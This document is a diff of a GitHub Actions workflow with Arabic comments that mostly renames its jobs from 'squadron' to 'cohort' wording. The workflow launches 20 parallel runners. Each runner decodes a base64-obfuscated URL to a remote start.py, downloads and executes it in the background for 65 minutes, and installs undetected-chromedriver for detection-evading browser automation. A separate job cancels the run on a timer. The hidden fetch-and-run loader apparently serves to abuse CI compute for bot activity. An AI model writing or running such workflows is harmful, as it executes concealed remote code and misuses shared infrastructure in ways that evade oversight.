@@ -1,12 +1,11 @@
-name: Linux Remote Task Squadron
+name: Linux Synchronized Task Cohort
 
 on:
   # استقبال أمر التشغيل من الخارج عبر التوكن بالكلمة المفتاحية: start
-  repository_dispatch:
-    types: [start]
+  workflow_dispatch:
 
 concurrency:
-  group: remote-squadron-${{ github.workflow }}-${{ github.ref }}
+  group: synchronized-cohort-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 permissions:
@@ -15,22 +14,22 @@ permissions:
 
 jobs:
   # =================================================================
-  # وحدة التحكم الزمنية: تُنهي الـ workflow بأكمله عند حد 65 دقيقة
+  # قائد الإغلاق النهائي: يُنهي الـ workflow بأكمله عند علامة 65 دقيقة
   # =================================================================
-  time-controller:
-    name: "Time Controller"
+  final-closure-commander:
+    name: "Final Closure Commander"
     runs-on: ubuntu-latest
     timeout-minutes: 70
     steps:
-      - name: Initiate Absolute Termination Cycle
+      - name: Execute Ultimate Shutdown Directive
         run: |
-          echo "[CONTROLLER] Time controller activated. Complete shutdown scheduled at the 65-minute boundary."
-          echo "[CONTROLLER] Tracking workflow identifier: ${{ github.run_id }}"
+          echo "[COMMANDER] Final closure commander has taken position. Ultimate shutdown armed at the 65-minute frontier."
+          echo "[COMMANDER] Monitoring workflow reference: ${{ github.run_id }}"
           
           # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
           sleep 3900
           
-          echo "[CONTROLLER] Boundary crossed! Triggering absolute termination cycle..."
+          echo "[COMMANDER] Frontier breached! Executing ultimate shutdown directive..."
           
           # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
           curl -sS -X POST \
@@ -39,70 +38,70 @@ jobs:
             -H "X-GitHub-Api-Version: 2022-11-28" \
             "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
           
-          echo "[CONTROLLER] Termination cycle dispatched. All active and queued units will be erased."
+          echo "[COMMANDER] Ultimate shutdown directive executed. Every active and queued unit will be extinguished."
 
   # =================================================================
-  # المهمة الرئيسية: تهيئة وإطلاق وحدات السرب
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات الفوج
   # =================================================================
-  launch-squadron:
-    name: "SquadronUnit-${{ matrix.unit_index }}"
+  rally-cohort:
+    name: "CohortUnit-${{ matrix.unit_badge }}"
     runs-on: ubuntu-latest
     timeout-minutes: 65
 
     strategy:
       fail-fast: false
       matrix:
-        unit_index: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        unit_badge: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
-      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
-      # [الطور ١] تأسيس البنية التحتية
-      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
-      - name: Build Infrastructure Base
+      # ✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹
+      # ▹ الطور الأول: تمهيد المنصة التشغيلية
+      # ✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹
+      - name: Pave Operational Platform
         run: |
-          echo "[BUILD] Building infrastructure base for SquadronUnit-${{ matrix.unit_index }} on Linux..."
+          echo "[PAVE] Paving operational platform for CohortUnit-${{ matrix.unit_badge }} on Linux..."
           sudo apt update -qq
           sudo apt install -y curl python3-pip
 
-      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
-      # [الطور ٢] جلب ملف المهمة من المستودع البعيد
-      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
-      - name: Download Mission File
+      # ✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹
+      # ▹ الطور الثاني: استلام الحزمة التنفيذية
+      # ✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹
+      - name: Collect Execution Bundle
         run: |
-          echo "[DOWNLOAD] Downloading app_task.py from designated host..."
-          HOST_ADDRESS=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QveGEvcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
-          curl -sL "$HOST_ADDRESS" -o app_task.py
-          echo "[DOWNLOAD] Mission file downloaded to workspace."
+          echo "[COLLECT] Collecting app_task.py from designated relay node..."
+          RELAY_NODE=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$RELAY_NODE" -o app_task.py
+          echo "[COLLECT] Execution bundle collected successfully."
 
-      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
-      # [الطور ٣] تثبيت متطلبات التشغيل
-      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
-      - name: Deploy Runtime Components
+      # ✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹
+      # ▹ الطور الثالث: تحضير المكونات التشغيلية
+      # ✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹
+      - name: Assemble Operational Components
         run: |
-          echo "[DEPLOY] Deploying runtime components..."
+          echo "[ASSEMBLE] Assembling operational components..."
           pip3 install -q undetected-chromedriver selenium requests
 
-      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
-      # [الطور ٤] التشغيل تحت إشراف زمني (65 دقيقة)
-      # ⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢⬢
-      - name: Execute Under Lifecycle Monitor
+      # ✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹
+      # ▹ الطور الرابع: التنفيذ المقيّد زمنياً (65 دقيقة)
+      # ✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹✹
+      - name: Conduct Constrained Execution
         run: |
-          echo ">> Activating SquadronUnit-${{ matrix.unit_index }}..."
+          echo ">> Rallying CohortUnit-${{ matrix.unit_badge }} operation..."
           
           # إطلاق العملية في الخلفية
           python3 app_task.py &
-          SQUADRON_PID=$!
+          COHORT_PID=$!
           
-          echo ">> Lifecycle monitor armed. Upper limit: 65 minutes (3900s)."
+          echo ">> Constraint supervisor deployed. Window: 65 minutes (3900s)."
           
           # الانتظار حتى استنفاد المدة المحددة
           sleep 3900
           
           # التحقق من حالة العملية وإنهاؤها عند الضرورة
-          if kill -0 $SQUADRON_PID 2>/dev/null; then
-            echo ">> Upper limit breached! Terminating operation..."
-            kill -9 $SQUADRON_PID
-            echo ">> Operation terminated by monitor."
+          if kill -0 $COHORT_PID 2>/dev/null; then
+            echo ">> Constraint window closed! Retiring operation..."
+            kill -9 $COHORT_PID
+            echo ">> Operation retired by supervisor."
           else
-            echo ">> Operation concluded before the upper limit."
+            echo ">> Operation finalized within constraint window."
           fi
